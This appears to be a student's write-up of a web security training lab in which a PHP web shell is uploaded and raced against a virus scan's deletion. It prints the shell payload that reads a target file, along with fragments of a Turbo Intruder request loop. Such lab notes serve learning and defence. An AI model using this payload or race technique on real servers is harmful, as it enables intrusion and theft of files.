# Lab07 - Web Shell Upload Via Race Condition

## Objective

Read:

```text
/home/carlos/secret
```

---

# Analysis

Application:

```text
Uploads File
        ↓
Virus Scan
        ↓
Deletes Malicious File
```

Need to access file before deletion.

---

# Full Payload Used

### Payload 1

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Turbo Intruder Attack

Upload request:

```python
engine.queue(target.req)
```

GET request:

```python
GET /files/avatars/exploit.php
```

Repeated rapidly.

---

Eventually:

```text
Race Won
```

File executed before deletion.

Lab solved.

---

# Why It Works

```text
Temporary Upload
        ↓
Window Exists
        ↓
Parallel Requests
        ↓
Execution Before Deletion
```

---

# Related Theory

- 12-race-conditions.md

---

# Key Learnings

Timing vulnerabilities can bypass security controls.